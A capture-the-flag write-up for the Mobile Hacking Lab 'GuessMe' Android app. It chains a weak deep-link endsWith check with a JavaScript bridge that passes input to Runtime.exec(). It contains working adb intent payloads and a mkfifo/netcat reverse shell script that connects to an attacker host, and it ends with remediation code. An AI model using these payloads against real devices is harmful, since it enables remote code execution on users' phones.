# GuessMe - Deep Link RCE Writeup

**Challenge:** GuessMe  
**Category:** Android / Deep Link Exploitation  
**Platform:** Mobile Hacking Lab  

---

## Overview

The GuessMe app contains two chained vulnerabilities in its deep link handler that lead to Remote Code Execution (RCE): a weak URL validation check that is trivially bypassed, and a JavaScript interface that passes unsanitized input directly to `Runtime.exec()`.

---

## Vulnerable Code

### 1. Weak URL Validation — `isValidDeepLink()`

```java
private final boolean isValidDeepLink(Uri uri) {
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null &&
        StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, null);
}
```

The validation only checks that the `url` parameter ends with `"mobilehackinglab.com"`. It does not validate the scheme or the actual domain. This means `javascript:` URLs pass validation when followed by a JavaScript comment (`//`) containing the expected string:

```
javascript:AndroidBridge.getTime('id')//mobilehackinglab.com
                                       ^^ JS comment — ignored by engine, passes endsWith check
```

### 2. Unsafe JavaScript Interface — `AndroidBridge.getTime()`

```java
webView.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");

@JavascriptInterface
public final String getTime(String Time) {
    Process process = Runtime.getRuntime().exec(Time); // unsanitized input executed as shell command
    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    return TextStreamsKt.readText(reader);
}
```

The `Time` parameter is passed directly to `Runtime.exec()` with no sanitization. Any JavaScript running in the WebView can call `AndroidBridge.getTime("any command")` and get the output back.

---

## Steps to Reproduce

### Requirements

- Kali Linux (attacker) with ADB and netcat
- Android emulator running the app (`com.mobilehackinglab.guessme`)

---

### Step 1 — Confirm Target

```bash
adb devices
adb shell pm list packages | grep guess
```

---

### Step 2 — Proof of RCE (File Write)

Special characters must be URL-encoded so the Android shell does not interpret them before the WebView receives them: `(` = `%28`, `)` = `%29`, `'` = `%27`, `>` = `%3E`, space = `%20`.

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "mhl://mobilehackinglab?url=javascript:AndroidBridge.getTime%28%27/system/bin/sh%20-c%20id%3E/data/data/com.mobilehackinglab.guessme/pwned.txt%27%29//mobilehackinglab.com"
```

Read the output:

```bash
adb shell
su
cat /data/data/com.mobilehackinglab.guessme/pwned.txt
```

Output:

```
uid=10211(u0_a211) gid=10211(u0_a211) groups=10211(u0_a211),3003(inet),...
```

---

### Step 3 — Reverse Shell (Full RCE)

Write the reverse shell script on the attacker machine and push it to the device:

```bash
cat > /tmp/rs.sh << 'EOF'
#!/system/bin/sh
rm -f /data/data/com.mobilehackinglab.guessme/backpipe
mkfifo /data/data/com.mobilehackinglab.guessme/backpipe
cat /data/data/com.mobilehackinglab.guessme/backpipe | /system/bin/sh -i 2>&1 | nc 10.0.2.2 4444 > /data/data/com.mobilehackinglab.guessme/backpipe
EOF

adb push /tmp/rs.sh /data/local/tmp/rs.sh
adb shell chmod 755 /data/local/tmp/rs.sh
```
<img width="1271" height="287" alt="image" src="https://github.com/user-attachments/assets/5f633472-f412-44be-987f-e32c189cfa85" />


Start the listener:

```bash
nc -lvnp 4444
```

Trigger via deep link:

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "mhl://mobilehackinglab?url=javascript:AndroidBridge.getTime%28%27/system/bin/sh%20/data/local/tmp/rs.sh%27%29//mobilehackinglab.com"
```

Shell received:

```
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37740
:/ $ whoami
u0_a211
:/ $ id
uid=10211(u0_a211) gid=10211(u0_a211) groups=10211(u0_a211),3003(inet),...
```

<img width="932" height="207" alt="image" src="https://github.com/user-attachments/assets/403f6d6e-da2d-42ac-a0c2-024fea603d4a" />


---

---

## Recommended Fixes

**Fix 1 — Validate the URL scheme and host properly, not with `endsWith()`:**

```java
// Vulnerable
return url.endsWith("mobilehackinglab.com");

// Fixed
Uri parsed = Uri.parse(url);
return "https".equals(parsed.getScheme()) &&
       "mobilehackinglab.com".equals(parsed.getHost());
```

This prevents `javascript:` URLs and attacker-hosted domains from passing validation.

**Fix 2 — Remove the unsafe JavaScript interface method:**

The `getTime()` method has no legitimate use case for executing shell commands. It must be removed entirely. If a JavaScript interface is required for other functionality, never pass user-controlled input to `Runtime.exec()`.

```java
// Remove this entirely
@JavascriptInterface
public final String getTime(String Time) {
    Process process = Runtime.getRuntime().exec(Time); // never do this
    ...
}
```

---

*Mobile Hacking Lab — GuessMe Challenge*
